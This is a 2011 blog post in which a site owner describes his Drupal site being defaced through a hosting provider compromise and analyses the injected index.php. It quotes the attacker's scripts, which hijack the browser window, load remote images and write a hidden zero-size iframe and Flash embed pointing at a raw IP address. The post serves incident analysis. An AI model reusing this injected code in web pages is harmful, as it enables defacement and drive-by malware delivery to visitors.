
---
title: "InMotion Hacked"
date: "2011-09-25T12:44:00-04:00"
draft: false
---

About half an hour ago, Sans sent me a text saying I should check my brolem site and that I made a friend. Indeed I did, what I saw is the pic on the right.

More details on the hack are here, which I found with a google search of Tiger-Mate. InMotion is the hosting provider for Brolem.net, and multiple accounts were defaced, not just ours. The "payload" of the attack, and I confirmed this with InMotion support, is to drop an index.php file in any directory that looks like an application root for popular CMS installations, such as Drupal. Fixing the hack was just a matter of copying back my original index.php.

Interestingly, I found a couple references to a similar attack in 2010 against Google, so apparently this kid really needs attention. I say kid because the payload makes me think of a teen script kiddie. I would much rather be pwned by someone I could learn from.

In any case, I'm going to reinstall Drupal some time this week (the release we have now is current) to be sure there aren't more index.php files laying around. I have no reason to suspect the database (meaning your accounts and passwords) was compromised.

Update: There is some embedded shell code in the index.php file. Not sure if that targets the webserver or the javascript engine in the browser yet.

Update 2:It's javascript. Sans, if AV starts lighting up you know where it came from! I'll post details in the comments as I learn more.

Update 3: Attached the payload in a tarball, if you want to explore yourself. I recommend against opening it in a browser. On Windows, you can open tarballs with 7-Zip.

Multiple scripts were in the index.php. 

<strong>Script 1</strong> is responsible for the moving mini-browser-box animation. I think it is harmless.

<pre>
function details() {
    window['open']('http://zone-h.org/archive/notifier=TiGER-M%40TE');
    window['open']('http://zone-h.org/archive/notifier=TiGER-M%40TE/special=1');
    window['open']('http://lmgtfy.com/?q=Hacked by TiGER-M%40TE');
};
window['scrollBy'](0, 1);
if (document['title'] == 'HackeD By TiGER-MaTE') {
    function keypressed() {
        return false;
    };
    document['onkeydown'] = keypressed;
    window['resizeTo'](0, 0);
    window['moveTo'](0, 0);
    setTimeout('move()', 2);
    var mxm = 50;
    var mym = 25;
    var mx = 0;
    var my = 0;
    var sv = 50;
    var status = 1;
    var szx = 0;
    var szy = 0;
    var c = 255;
    var n = 0;
    var sm = 30;
    var cycle = 2;
    var done = 2;

    function move() {
        if (status == 1) {
            mxm = mxm / 1.05;
            mym = mym / 1.05;
            mx = mx + mxm;
            my = my - mym;
            mxm = mxm + (400 - mx) / 100;
            mym = mym - (300 - my) / 100;
            window['moveTo'](mx, my);
            rmxm = Math['round'](mxm / 10);
            rmym = Math['round'](mym / 10);
            if (rmxm == 0) {
                if (rmym == 0) {
                    status = 2;
                };
            };
        };
        if (status == 2) {
            sv = sv / 1.1;
            scrratio = 1 + 1 / 3;
            mx = mx - sv * scrratio / 2;
            my = my - sv / 2;
            szx = szx + sv * scrratio;
            szy = szy + sv;
            window['moveTo'](mx, my);
            window['resizeTo'](szx, szy);
            if (sv < 0.1) {
                status = 3;
            };
        };
        if (status == 3) {
            document['fgColor'] = 0xffffFF;
            c = c - 16;
            if (c < 0) {
                status = 8;
            };
        };
        if (status == 4) {
            c = c + 16;
            document['bgColor'] = c * 65536;
            document['fgColor'] = (255 - c) * 65536;
            if (c > 239) {
                status = 5;
            };
        };
        if (status == 5) {
            c = c - 16;
            document['bgColor'] = c * 65536;
            document['fgColor'] = (255 - c) * 65536;
            if (c < 0) {
                status = 6;
                cycle = cycle - 1;
                if (cycle > 0) {
                    if (done == 1) {
                        status = 7;
                    } else {
                        status = 4;
                    };
                };
            };
        };
        if (status == 6) {
            document['title'] = 'LOL';
            alert('LOL');
            cycle = 2;
            status = 4;
            done = 1;
        };
        if (status == 7) {
            c = c + 4;
            document['bgColor'] = c * 65536;
            document['fgColor'] = (255 - c) * 65536;
            if (c > 128) {
                status = 8;
            };
        };
        if (status == 8) {
            window['moveTo'](0, 0);
            sx = screen['availWidth'];
            sy = screen['availHeight'];
            window['resizeTo'](sx, sy);
            status = 9;
        };
        var _0xceebx11 = setTimeout('move()', 0.3);
    };
};
</pre>

<strong>Script 2</strong> just checks for the browser name, it is trivial and does not actually run anything.

<strong>Script 3</strong> de-obfuscates embedded GIF data. This could be dangerous, will look into what exactly that is.

<strong>Script 4</strong> is like #2, merely for formatting. I guess script kiddies care about being browser compliant.

<strong>Script 5</strong> downloads the [HACKED] jpeg image. Not sure if this has embedded exploits yet, but this could be bad too. You download from an obviously illicit site.

<pre>
if (document['title'] != 'HackeD By TiGER-MaTE') {
    exit(0);
};
document['write']('&lt;img src=&quot;http://www.fotonons.ru/images/17.03.11/bytigermte.jpg&quot; onerror=&quot;this.onerror=null;this.src='http://image.bayimg.com/maeadaadi.jpg';&quot; /&gt;');
</pre>

Finally, <strong>Script 6</strong> is run, which plays an embedded MP3.

<pre>
if(document.title!='HackeD By TiGER-MaTE') {
    exit(0);
}
document.write('&lt;iframe frameborder=&quot;0&quot; height=&quot;0&quot; width=&quot;0&quot;  src=&quot;http://77.247.69.68/.../404.php&quot;&gt;&lt;/iframe&gt;&lt;embed src=&quot;http://77.247.69.68/.../By_TiGER-MaTE.swf?soundswf=http://77.247.69.68/.../TiGER-MaTE.swf&amp;autoplay=1&amp;loops=1&quot; width=&quot;0&quot; height=&quot;0&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/embed&gt;');
</pre>

Script 3 most likely contains malware, but 5 and 6 could too.
